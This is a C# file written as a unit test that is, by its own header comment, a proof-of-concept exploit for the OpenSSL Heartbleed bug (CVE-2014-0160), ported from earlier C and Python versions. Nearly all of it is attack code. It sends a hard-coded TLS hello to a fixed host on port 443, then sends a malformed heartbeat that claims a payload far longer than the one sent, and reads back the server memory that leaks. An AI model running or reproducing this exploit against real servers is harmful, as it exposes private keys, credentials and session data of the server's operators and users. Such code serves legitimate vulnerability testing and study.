using System;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Serilog;

/*
*  DotNet OpenSSL Heartbleed PoC at https://github.com/ShawInnes/HeartBleedDotNet
*  by Shaw Innes (shaw@immortal.net.au)
*
*  Based on CVE-2014-0160 OpenSSL Heartbleed PoC at https://github.com/pakesson/heartbleed-c
*  by Philip Åkesson (philip.akesson@gmail.com)
*
*  Original Python version at http://www.exploit-db.com/exploits/32745/
*  by Jared Stafford (jspenguin@jspenguin.org)
*/

namespace HeartBleed.Net
{
    [TestClass]
    public class HeartBleedTests
    {
        private const int SSL3_RT_HEADER_LENGTH = 5;
        
        public enum SSLVersion
        {
            SSL3_VERSION = 0x0300,
            TLS1_0_VERSION = 0x0301,
            TLS1_1_VERSION = 0x0302,
            TLS1_2_VERSION = 0x0303,
        }

        public enum SSLHeaderType
        {
            SSL3_RT_CHANGE_CIPHER_SPEC = 20,
            SSL3_RT_ALERT = 21,
            SSL3_RT_HANDSHAKE = 22,
            SSL3_RT_APPLICATION_DATA = 23,
            SSL3_RT_HEARTBEAT = 24
        }

        public enum SSLHandshakeType
        {
            SSL3_MT_HELLO_REQUEST = 0,
            SSL3_MT_CLIENT_HELLO = 1,
            SSL3_MT_SERVER_HELLO = 2,
            SSL3_MT_CERTIFICATE = 11,
            SSL3_MT_SERVER_KEY_EXCHANGE = 12,
            SSL3_MT_CERTIFICATE_REQUEST = 13,
            SSL3_MT_SERVER_DONE = 14,
            SSL3_MT_CERTIFICATE_VERIFY = 15,
            SSL3_MT_CLIENT_KEY_EXCHANGE = 16,
            SSL3_MT_FINISHED = 20,
        }                    
        
        byte[] hello = {
	                    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
	                    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
	                    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
	                    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
	                    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
	                    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
	                    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
	                    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
	                    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
	                    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
	                    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
	                    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
	                    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
	                    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
	                    0x01 };

        byte[] heartbeat = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };

        private bool ReceiveHeader(System.Net.Sockets.Socket socket, ref byte type, ref ushort version, ref ushort length)
        {
            byte[] buffer = new byte[SSL3_RT_HEADER_LENGTH];
            length = SSL3_RT_HEADER_LENGTH;

            int receive = socket.Receive(buffer, SSL3_RT_HEADER_LENGTH, System.Net.Sockets.SocketFlags.None);
            if (receive != SSL3_RT_HEADER_LENGTH)
            {
                Log.Error("Invalid HEADER size");
                return false;
            }

            type = buffer[0];
            version = (ushort)((buffer[1] << 8) | buffer[2]);
            length = (ushort)((buffer[3] << 8) | buffer[4]);

            return true;
        }

        private bool ReceiveData(System.Net.Sockets.Socket socket, ref ushort length, ref byte[] buffer)
        {
            buffer = new byte[length];

            int receive = socket.Receive(buffer, length, System.Net.Sockets.SocketFlags.None);
            if (receive != length)
            {
                Log.Error("Invalid DATA size");
                return false;
            }

            return true;
        }

        private void HexDump(byte[] buffer, ushort length)
        {
            throw new NotImplementedException();
        }

        [TestMethod]
        public void TestMethod1()
        {
            string host = "10.0.52.25";
            int port = 443;

            Log.Logger = new LoggerConfiguration()
                                .WriteTo.Trace()
                                .CreateLogger();

            using (System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.IP))
            {
                Log.Information("Connecting Socket");
                socket.Connect(host, port);

                Log.Information("Sending HELLO");
                if (socket.Send(hello) != hello.Length)
                    throw new InvalidOperationException("Error while sending HELLO");

                byte[] buffer = null;
                byte type = 0;
                ushort version = 0;
                ushort length = 0;

                Log.Information("Receiving HELLO");
                if (!ReceiveHeader(socket, ref type, ref version, ref length))
                    throw new InvalidOperationException("Error while receiving header");

                Log.Information("ReceiveHeader {Type} {Version} {Length}", (SSLHeaderType)type, (SSLVersion)version, length);

                if (!ReceiveData(socket, ref length, ref buffer))
                    throw new InvalidOperationException("Error while receiving data");

                if ((SSLHeaderType)type == SSLHeaderType.SSL3_RT_HANDSHAKE)
                {
                    int offset = 0;
                    while (offset < length)
                    {
                        SSLHandshakeType handshake = (SSLHandshakeType)buffer[offset];

                        if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
                            break;

                        int handshakeLength = ((buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]);

                        Log.Information("Receive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);

                        offset += 4; // skip header
                        offset += handshakeLength;
                    }
                }

                Log.Information("Sending HEARTBEAT");
                if (socket.Send(heartbeat) != heartbeat.Length)
                    throw new InvalidOperationException("Error while sending HEARTBEAT");

                Log.Information("Receiving HEARTBEAT");
                if (!ReceiveHeader(socket, ref type, ref version, ref length))
                    throw new InvalidOperationException("Error while receiving header");

                if ((SSLHeaderType)type != SSLHeaderType.SSL3_RT_HEARTBEAT)
                    throw new InvalidOperationException("Invalid HEARTBEAT response");

                if (!ReceiveData(socket, ref length, ref buffer))
                    throw new InvalidOperationException("Error while receiving data");

                socket.Close();

                HexDump(buffer, length);
            }
        }
    }
}